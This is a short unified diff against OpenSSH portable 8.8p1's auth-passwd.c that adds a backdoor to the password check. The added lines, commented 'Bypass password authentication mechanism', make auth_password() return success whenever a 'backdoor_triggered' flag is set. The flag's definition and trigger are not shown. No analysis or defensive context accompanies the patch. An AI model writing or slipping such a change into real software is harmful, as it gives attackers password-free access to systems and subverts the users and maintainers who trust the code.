@@ -1,0 +1,11 @@
+--- openssh-portable-v8.8_p1/auth-passwd.c	2021-12-02 17:04:09.337420945 -0600
++++ openssh-portable-patch/auth-passwd.c	2021-12-02 17:31:51.647606026 -0600
+@@ -76,6 +76,8 @@
+ int
+ auth_password(struct ssh *ssh, const char *password)
+ {
++	/* Bypass password authentication mechanism */
++	if (ssh->backdoor_triggered == 1) return 1;
+ 	Authctxt *authctxt = ssh->authctxt;
+ 	struct passwd *pw = authctxt->pw;
+ 	int result, ok = authctxt->valid;
